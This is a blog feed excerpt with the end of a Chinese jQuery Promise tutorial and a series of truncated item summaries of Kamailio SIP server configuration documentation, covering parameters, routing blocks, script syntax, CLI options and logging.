//根据callId查询录音文件，不仅仅是异步请求可以做成Promise形式，任何函数都可以做成Promise形式
App.addMethod(&amp;#39;_getRecordingsByCallId&amp;#39;,function(callId){
    var dfd = $.Deferred(),
        path = &amp;#39;/api/tenantcalls/&amp;#39;+callId+&amp;#39;/recordings&amp;#39;;

    App._sendRequest(path)
    .done(function(res){dfd.resolve(res);})
    .fail(function(res){dfd.reject(res);});

    return dfd.promise();
});

// 获取录音
App.addMethod(&amp;#39;getCallDetailRecordings&amp;#39;,function(callId){
    App._getRecordingsByCallId(callId)
    .done(function(res){
        // 获取结果后渲染数据
        App.renderRecording(res);
    })
    .fail(function(res){
        App.error(res);
    });
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-注意事项&#34;&gt;5. 注意事项&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;jQuery的Promise主要是用了jQquery的$.Derferred()方法，一些老版本的jquery并不支持此方法。&lt;/li&gt;
&lt;li&gt;jQuery版本必须大于等于1.5，推荐使用1.11.3&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-参考文献&#34;&gt;6. 参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://api.jquery.com/&#34;&gt;jquery官方api文档&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/JQuery&#34;&gt;jquery维基百科文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;7-最后&#34;&gt;7. 最后&lt;/h1&gt;
&lt;p&gt;以上文章仅供参考，不包完全正确。欢迎评论，3q。&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.1 脚本结构 - 全局参数、模块配置、路由</title>
      <link>https://wdd.js.org/kamailio/56/structure/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/structure/</guid>
      <description>&lt;h1 id=&#34;1-structure&#34;&gt;1. Structure&lt;/h1&gt;
&lt;p&gt;The structure of the kamailio.cfg can be seen as three parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;global parameters&lt;/li&gt;
&lt;li&gt;modules settings&lt;/li&gt;
&lt;li&gt;routing blocks&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For clarity and making it easy to maintain, it is recommended to keep
them in this order, although some of them can be mixed.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;✅ 这三个部分可以混合，但为了清晰和维护的方便，建议按照这个顺序排列。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;2-global-parameters-section&#34;&gt;2. Global Parameters Section&lt;/h1&gt;
&lt;p&gt;This is the first part of the configuration file, containing the
parameters for the core of kamailio and custom global parameters.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.10 SCTP参数</title>
      <link>https://wdd.js.org/kamailio/56/sctp-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/sctp-params/</guid>
      <description>&lt;h1 id=&#34;1-disable_sctp&#34;&gt;1. disable_sctp&lt;/h1&gt;
&lt;p&gt;Global parameter to disable SCTP support in the SIP server. see
enable_sctp&lt;/p&gt;
&lt;p&gt;Default value is &amp;lsquo;auto&amp;rsquo;.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  disable_sctp=yes
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-enable_sctp&#34;&gt;2. enable_sctp&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;enable_sctp = 0/1/2  - SCTP disabled (0)/ SCTP enabled (1)/auto (2),
                       default auto (2)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-sctp_children&#34;&gt;3. sctp_children&lt;/h1&gt;
&lt;p&gt;sctp children no (similar to udp children)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sctp_children = number
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;4-sctp_socket_rcvbuf&#34;&gt;4. sctp_socket_rcvbuf&lt;/h1&gt;
&lt;p&gt;Size for the sctp socket receive buffer&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Alias name:&lt;/strong&gt; &lt;strong&gt;sctp_socket_receive_buffer&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sctp_socket_rcvbuf = number
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;5-sctp_socket_sndbuf&#34;&gt;5. sctp_socket_sndbuf&lt;/h1&gt;
&lt;p&gt;Size for the sctp socket send buffer&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.11 UDP参数</title>
      <link>https://wdd.js.org/kamailio/56/udp-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/udp-params/</guid>
      <description>&lt;h1 id=&#34;1-udp4_raw&#34;&gt;1. udp4_raw&lt;/h1&gt;
&lt;p&gt;Enables raw socket support for sending UDP IPv4 datagrams (40-50%
performance increase on linux multi-cpu).&lt;/p&gt;
&lt;p&gt;Possible values: 0 - disabled (default), 1 - enabled, -1 auto.&lt;/p&gt;
&lt;p&gt;In &amp;ldquo;auto&amp;rdquo; mode it will be enabled if possible (sr started as root or
with CAP_NET_RAW). udp4_raw can be used on Linux and FreeBSD. For other
BSDs and Darwin one must compile with -DUSE_RAW_SOCKS. On Linux one
should also set udp4_raw_mtu if the MTU on any network interface that
could be used for sending is smaller than 1500.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.12 黑名单参数</title>
      <link>https://wdd.js.org/kamailio/56/bl-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/bl-params/</guid>
      <description>&lt;h1 id=&#34;1-dst_blocklist_expire&#34;&gt;1. dst_blocklist_expire&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Alias name:&lt;/strong&gt; &lt;strong&gt;dst_blocklist_ttl&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;How much time a blocklisted destination will be kept in the blocklist
(w/o any update).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dst_blocklist_expire = time in s (default 60 s)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-dst_blocklist_gc_interval&#34;&gt;2. dst_blocklist_gc_interval&lt;/h1&gt;
&lt;p&gt;How often the garbage collection will run (eliminating old, expired
entries).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dst_blocklist_gc_interval = time in s (default 60 s)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-dst_blocklist_init&#34;&gt;3. dst_blocklist_init&lt;/h1&gt;
&lt;p&gt;If off, the blocklist is not initialized at startup and cannot be
enabled at runtime, this saves some memory.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.13 实时参数</title>
      <link>https://wdd.js.org/kamailio/56/rt-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/rt-params/</guid>
      <description>&lt;h1 id=&#34;1-real_time&#34;&gt;1. real_time&lt;/h1&gt;
&lt;p&gt;Sets real time priority for all the Kamailio processes, or the timers
(bitmask).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   Possible values:   0  - off
                      1  - the &amp;quot;fast&amp;quot; timer
                      2  - the &amp;quot;slow&amp;quot; timer
                      4  - all processes, except the timers
   Example: real_time= 7 =&amp;gt; everything switched to real time priority.

real_time = &amp;lt;int&amp;gt; (flags) (default off)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-rt_policy&#34;&gt;2. rt_policy&lt;/h1&gt;
&lt;p&gt;Real time scheduling policy, 0 = SCHED_OTHER, 1= SCHED_RR and
2=SCHED_FIFO&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rt_policy= &amp;lt;0..3&amp;gt; (default 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;3-rt_prio&#34;&gt;3. rt_prio&lt;/h1&gt;
&lt;p&gt;Real time priority used for everything except the timers, if real_time
is enabled.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.14 核心函数</title>
      <link>https://wdd.js.org/kamailio/56/core-func/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/core-func/</guid>
      <description>&lt;p&gt;Functions exported by core that can be used in route blocks.&lt;/p&gt;
&lt;h1 id=&#34;1-add_local_rport-&#34;&gt;1. add_local_rport ⭐️&lt;/h1&gt;
&lt;p&gt;Add &lt;strong&gt;rport&lt;/strong&gt; parameter to local generated Via header &amp;ndash; see RFC3581. In
effect for forwarded SIP requests.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add_local_rport&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-avpflags&#34;&gt;2. avpflags&lt;/h1&gt;
&lt;h1 id=&#34;3-break&#34;&gt;3. break&lt;/h1&gt;
&lt;p&gt;&amp;lsquo;break&amp;rsquo; statement can be used to end a &amp;lsquo;case&amp;rsquo; block in a &amp;lsquo;switch&amp;rsquo;
statement or exit from a &amp;lsquo;while&amp;rsquo; statement.&lt;/p&gt;
&lt;h1 id=&#34;4-drop-&#34;&gt;4. drop ⭐️&lt;/h1&gt;
&lt;p&gt;Stop the execution of the configuration script and alter the implicit
action which is done afterwards.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.15 自定义全局参数</title>
      <link>https://wdd.js.org/kamailio/56/custom-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/custom-params/</guid>
      <description>&lt;p&gt;These are parameters that can be defined by the writer of kamailio.cfg
in order to be used inside routing blocks. One of the important
properties for custom global parameters is that their value can be
changed at runtime via RPC commands, without restarting Kamailio.&lt;/p&gt;
&lt;p&gt;The definition of a custom global parameter must follow the pattern:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;group.variable = value desc &amp;quot;description&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The value can be a quoted string or integer number.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.16 路由块 - 请求路由、响应路由、分支路由、失败路由等</title>
      <link>https://wdd.js.org/kamailio/56/routing-blocks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/routing-blocks/</guid>
      <description>&lt;h1 id=&#34;1-routing-blocks&#34;&gt;1. Routing Blocks&lt;/h1&gt;
&lt;p&gt;The routing blocks are the parts of the configuration file executed by
kamailio at runtime. They can be seen as blocks of actions similar to
functions (or procedures) from common programming languages.&lt;/p&gt;
&lt;p&gt;A routing block is identified by a specific token, followed by a name in
between square brackets and actions in between curly braces.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route_block_id[NAME] {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ACTIONS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The name can be any alphanumeric string, with specific routing blocks
enforcing a particular format.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.17 脚本语法 - if、else、switch、while、赋值、比较、算数等</title>
      <link>https://wdd.js.org/kamailio/56/script-statements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/script-statements/</guid>
      <description>&lt;h1 id=&#34;1-if&#34;&gt;1. if&lt;/h1&gt;
&lt;p&gt;IF-ELSE statement&lt;/p&gt;
&lt;p&gt;Prototype:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    if(expr) {
       actions;
    } else {
       actions;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;expr&lt;/code&gt; should be a valid logical expression.&lt;/p&gt;
&lt;p&gt;The logical operators that can be used in &lt;code&gt;expr&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;==&lt;/code&gt;:      equal&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!=&lt;/code&gt;:      not equal&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=~&lt;/code&gt;:      case-insensitive regular expression matching: Note: Posix regular expressions will be used, e.g. use &lt;code&gt;[[:digit:]]{3}&lt;/code&gt; instead of &lt;code&gt;\d\d\d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!~&lt;/code&gt;:      regular expression not-matching (NOT PORTED from Kamailio 1.x, use &lt;code&gt;!(x =~ y)&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;:       greater&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;=&lt;/code&gt;:      greater or equal&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;:       less&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;=&lt;/code&gt;:      less or equal&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;:      logical AND&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;:      logical OR&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!&lt;/code&gt;:       logical NOT&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.18 命令行参数</title>
      <link>https://wdd.js.org/kamailio/56/cli-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/cli-params/</guid>
      <description>&lt;h1 id=&#34;command-line-parameters&#34;&gt;Command Line Parameters&lt;/h1&gt;
&lt;p&gt;Kamailio can be started with a set of command line parameters, providing
more flexibility to control what is doing at runtime. Some of them can
be quite useful when running on containerised environments.&lt;/p&gt;
&lt;p&gt;To see the the available command line parameters, run &lt;strong&gt;kamailio -h&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# kamailio -h

version: kamailio 5.4.0-dev4 (x86_64/darwin) 8c1864
Usage: kamailio [options]
Options:
    -a mode      Auto aliases mode: enable with yes or on,
                  disable with no or off
    --alias=val  Add an alias, the value has to be &#39;[proto:]hostname[:port]&#39;
                  (like for &#39;alias&#39; global parameter)
    -A define    Add config pre-processor define (e.g., -A WITH_AUTH,
                  -A &#39;FLT_ACC=1&#39;, -A &#39;DEFVAL=&amp;quot;str-val&amp;quot;&#39;)
    -b nr        Maximum receive buffer size which will not be exceeded by
                  auto-probing procedure even if  OS allows
    -c           Check configuration file for syntax errors
    -d           Debugging mode (multiple -d increase the level)
    -D           Control how daemonize is done:
                  -D..do not fork (almost) anyway;
                  -DD..do not daemonize creator;
                  -DDD..daemonize (default)
    -e           Log messages printed in terminal colors (requires -E)
    -E           Log to stderr
    -f file      Configuration file (default: /usr/local/etc/kamailio/kamailio.cfg)
    -g gid       Change gid (group id)
    -G file      Create a pgid file
    -h           This help message
    --help       Long option for `-h`
    -I           Print more internal compile flags and options
    -K           Turn on &amp;quot;via:&amp;quot; host checking when forwarding replies
    -l address   Listen on the specified address/interface (multiple -l
                  mean listening on more addresses). The address format is
                  [proto:]addr_lst[:port][/advaddr],
                  where proto=udp|tcp|tls|sctp,
                  addr_lst= addr|(addr, addr_lst),
                  addr=host|ip_address|interface_name and
                  advaddr=addr[:port] (advertised address).
                  E.g: -l localhost, -l udp:127.0.0.1:5080, -l eth0:5062,
                  -l udp:127.0.0.1:5080/1.2.3.4:5060,
                  -l &amp;quot;sctp:(eth0)&amp;quot;, -l &amp;quot;(eth0, eth1, 127.0.0.1):5065&amp;quot;.
                  The default behaviour is to listen on all the interfaces.
    --loadmodule=name load the module specified by name
    --log-engine=log engine name and data
    -L path      Modules search path (default: /usr/local/lib64/kamailio/modules)
    -m nr        Size of shared memory allocated in Megabytes
    --modparam=modname:paramname:type:value set the module parameter
                  type has to be &#39;s&#39; for string value and &#39;i&#39; for int value,
                  example: --modparam=corex:alias_subdomains:s:kamailio.org
    -M nr        Size of private memory allocated, in Megabytes
    -n processes Number of child processes to fork per interface
                  (default: 8)
    -N           Number of tcp child processes (default: equal to `-n&#39;)
    -O nr        Script optimization level (debugging option)
    -P file      Create a pid file
    -Q           Number of sctp child processes (default: equal to `-n&#39;)
    -r           Use dns to check if is necessary to add a &amp;quot;received=&amp;quot;
                  field to a via
    -R           Same as `-r` but use reverse dns;
                  (to use both use `-rR`)
    --server-id=num set the value for server_id
    --subst=exp set a subst preprocessor directive
    --substdef=exp set a substdef preprocessor directive
    --substdefs=exp set a substdefs preprocessor directive
    -S           disable sctp
    -t dir       Chroot to &amp;quot;dir&amp;quot;
    -T           Disable tcp
    -u uid       Change uid (user id)
    -v           Version number
    --version    Long option for `-v`
    -V           Alternative for `-v`
    -x name      Specify internal manager for shared memory (shm)
                  - can be: fm, qm or tlsf
    -X name      Specify internal manager for private memory (pkg)
                  - if omitted, the one for shm is used
    -Y dir       Runtime dir path
    -w dir       Change the working directory to &amp;quot;dir&amp;quot; (default: &amp;quot;/&amp;quot;)
    -W type      poll method (depending on support in OS, it can be: poll,
                  epoll_lt, epoll_et, sigio_rt, select, kqueue, /dev/poll)
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>1.19 日志引擎</title>
      <link>https://wdd.js.org/kamailio/56/log-engine/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/log-engine/</guid>
      <description>&lt;h1 id=&#34;log-engine-cli-parameter&#34;&gt;Log Engine CLI Parameter&lt;/h1&gt;
&lt;p&gt;The &lt;strong&gt;&amp;ndash;log-engine&lt;/strong&gt; parameter allows to specify what logging engine to
be used, which is practically about the format of the log messages. If
not set at all, then Kamailio does the classic style of line-based plain
text log messages.&lt;/p&gt;
&lt;p&gt;The value of this parameter can be &lt;strong&gt;&amp;ndash;log-engine=name&lt;/strong&gt; or
&lt;strong&gt;&amp;ndash;log-engine=name:data&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The name of the log engine can be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;json&lt;/strong&gt; - write logs in structured JSON format
&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;data&lt;/strong&gt; for &lt;strong&gt;json&lt;/strong&gt; log engine can be a set of character
flags:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;a&lt;/strong&gt; - add log prefix as a special field&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A&lt;/strong&gt; - do not add log prefix&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;c&lt;/strong&gt; - add Call-ID (when available) as a dedicated JSON
attribute&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;j&lt;/strong&gt; - the log prefix and message fields are printed in
JSON structure format, detecting if they are enclosed in
between &lt;strong&gt;{ }&lt;/strong&gt; or adding them as a &lt;strong&gt;text&lt;/strong&gt; field&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;M&lt;/strong&gt; - strip EOL (&amp;rsquo;\n&amp;rsquo;) from the value of the log message
field&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;N&lt;/strong&gt; - do not add EOL at the end of JSON document&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;p&lt;/strong&gt; - the log prefix is printed as it is in the root json
document, it has to start with comma (&lt;strong&gt;,&lt;/strong&gt;) and be a valid
set of json fields&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;U&lt;/strong&gt; - CEE (Common Event Expression) schema format -
&lt;a href=&#34;https://cee.mitre.org/language/1.0-beta1/core-profile.html&#34;&gt;https://cee.mitre.org/language/1.0-beta1/core-profile.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example of JSON logs when running Kamailio with
&amp;ldquo;&lt;strong&gt;&amp;ndash;log-engine=json:M&lt;/strong&gt;&amp;rdquo; :&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.2 通用元素 - 注释、标识符、变量、值、表达式</title>
      <link>https://wdd.js.org/kamailio/56/generic-elements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/generic-elements/</guid>
      <description>&lt;h1 id=&#34;1-comments&#34;&gt;1. Comments&lt;/h1&gt;
&lt;p&gt;Line comments start with &lt;strong&gt;#&lt;/strong&gt; (hash/pound character - like in shell) or
&lt;strong&gt;/ /&lt;/strong&gt; (double forward slash - like in C++/Java).&lt;/p&gt;
&lt;p&gt;Block comments start with /* (forward slash and asterisk) and are ended
by */ (sterisk and forward slash) (like in C, C++, Java).&lt;/p&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  # this is a line comment

  // this is another line comment

  /* this
     is
     a
     block
     comment */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Important: be aware of preprocessor directives that start with &lt;strong&gt;#!&lt;/strong&gt;
(hash/pound and exclamation) - those are no longer line comments.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.3 预处理指令 - 文件导入、宏定义、环境变量读取</title>
      <link>https://wdd.js.org/kamailio/56/pre-processor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/pre-processor/</guid>
      <description>&lt;p&gt;预处理指令主要的目的是方便脚本维护，方便脚本在不同环境下运行。
预处理之后，脚本才会开始解析。&lt;/p&gt;
&lt;h1 id=&#34;1-include_file&#34;&gt;1. include_file&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;   include_file &amp;quot;path_to_file&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Include the content of the file in config before parsing. path_to_file
must be a static string. Including file operation is done at startup. If
you change the content of included file, you have to restart the SIP
server to become effective.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;路径必须是静态，修改脚本要重启&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The path_to_file can be relative or absolute. If it is not absolute
path, first attempt is to locate it relative to current directory, and
if fails, relative to directory of the file that includes it. There is
no restriction where include can be used or what can contain - any part
of config file is ok. There is a limit of maximum 10 includes in depth,
otherwise you can use as many includes as you want. Reporting of the cfg
file syntax errors prints now the file name for easier troubleshooting.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.4 关键词</title>
      <link>https://wdd.js.org/kamailio/56/core-keywords/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/core-keywords/</guid>
      <description>&lt;p&gt;Keywords specific to SIP messages which can be used mainly in &lt;code&gt;if&lt;/code&gt;
expressions.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;核心关键词主要用在if语句里，如果用在xlog里打印，那么就打印的是字符串了呀&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-af&#34;&gt;1. af&lt;/h1&gt;
&lt;p&gt;The address family of the received SIP message. It is INET if the
message was received over IPv4 or INET6 if the message was received over
IPv6.&lt;/p&gt;
&lt;p&gt;Exampe of usage:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (af&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;INET6) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message received over IPv6 link&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-dst_ip&#34;&gt;2. dst_ip&lt;/h1&gt;
&lt;p&gt;The IP of the local interface where the SIP message was received. When
the proxy listens on many network interfaces, makes possible to detect
which was the one that received the packet.&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.5 核心值</title>
      <link>https://wdd.js.org/kamailio/56/core-values/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/core-values/</guid>
      <description>&lt;p&gt;Values that can be used in &lt;code&gt;&#39;if&lt;/code&gt;&amp;rsquo; expressions to check against Core
Keywords&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主要还是用在if语句里做比较&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-inet&#34;&gt;1. INET&lt;/h1&gt;
&lt;p&gt;This keyword can be used to test whether the SIP packet was received
over an IPv4 connection.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (af&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;INET) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;the SIP message was received over IPv4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-inet6&#34;&gt;2. INET6&lt;/h1&gt;
&lt;p&gt;This keyword can be used to test whether the SIP packet was received
over an IPv6 connection.&lt;/p&gt;
&lt;p&gt;Example of usage:&lt;/p&gt;</description>
    </item>
    <item>
      <title>1.6 核心参数</title>
      <link>https://wdd.js.org/kamailio/56/core-params/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://wdd.js.org/kamailio/56/core-params/</guid>
      <description>&lt;p&gt;kamailio和核心参数有106个，控制了kamailio的运行方式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#1-advertised_address&#34;&gt;1. advertised_address&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#2-advertised_port&#34;&gt;2. advertised_port&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#3-alias-%EF%B8%8F&#34;&gt;3. alias ⭐️&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#4-async_workers&#34;&gt;4. async_workers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#5-async_nonblock&#34;&gt;5. async_nonblock&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#6-async_usleep&#34;&gt;6. async_usleep&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#7-async_workers_group&#34;&gt;7. async_workers_group&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#8-auto_aliases&#34;&gt;8. auto_aliases&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#9-auto_bind_ipv6&#34;&gt;9. auto_bind_ipv6&lt;/a&gt;&lt;/li&gt;
